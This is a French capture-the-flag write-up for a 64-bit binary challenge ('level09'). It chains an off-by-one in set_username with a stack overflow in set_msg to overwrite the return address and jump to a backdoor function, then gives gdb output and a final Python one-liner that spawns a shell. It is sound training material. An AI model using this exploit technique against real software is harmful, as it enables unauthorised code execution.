On repère une fonction `secret_backdoor` qui appelle `system()` avec notre entrée 
Donc si on arrive à écraser l'**adresse de retour** avec l'adresse de `secret_backdoor`, on obtient un shell (et le flag).

Le binaire est en EIP: il faut l'adresse à l'exécution (base + 0x88c), pas l'offset statique. On lance le programme puis on lit l'adresse :
```
(gdb) b main
Breakpoint 1 at 0x555555554aac
(gdb) r
Starting program: /home/users/level09/level09
warning: no loadable sections found in added symbol-file system-supplied DSO at 0x7ffff7ffa000

Breakpoint 1, 0x0000555555554aac in main ()
(gdb) p secret_backdoor
$2 = {<text variable, no debug info>} 0x55555555488c <secret_backdoor>
```
`secret_backdoor` = `0x55555555488c`.

## Étape 1 : agrandir msg_len (via set_username)

`username` fait 40 octets, mais dans `set_username` la boucle s'arrête à `if (i > 0x28) break;` → on peut écrire jusqu'au **41ᵉ** octet. Ce 41ᵉ octet tombe pile sur le champ `msg_len` :

```
0x8cb <+11>:  lea  -0xc0(%rbp),%rax   ; adresse de la struct (rbp-0xc0)
0x8d2 <+18>:  add  $0x8c,%rax          ; saute msg[], pointe username (-0xc0 + 0x8c)
...                                     ; memset(username, 0, 40)
0x8ff <+63>:  movl $0x8c,-0xc(%rbp)     ; msg_len = 0x8c, situé en 0xb4
                                         0xc = -0xc0 + 0x8c + 40, juste après username
```

On met donc le 41ᵉ caractère à `\xff` (255) :

​```
40 * 'a' + '\xff'      ->  msg_len = 0x000000ff = 255
​```

## Étape 2 : écraser l'adresse de retour (via set_msg)

`set_msg` fait `strncpy(msg, entrée, msg_len)`. Avec `msg_len = 255` au lieu
de 140, on déborde `msg[140]`.

`msg` est en `rbp-0xc0`, l'adresse de retour en `rbp+8` → décalage `0xc8 = 200`. On remplit 200 octets puis on place l'adresse (en little-endian) :

​```
'a' * 200 + p64(0x55555555488c) = 'a'*200 + '\x8c\x48\x55\x55\x55\x55\x00\x00'
​```

## Script final

​```bash
(python -c "print 40*'a' + '\xff' + '\n' + 'a'*200 + '\x8c\x48\x55\x55\x55\x55\x00\x00' + '\n' + '/bin/sh'"; cat -) | ./level09
​```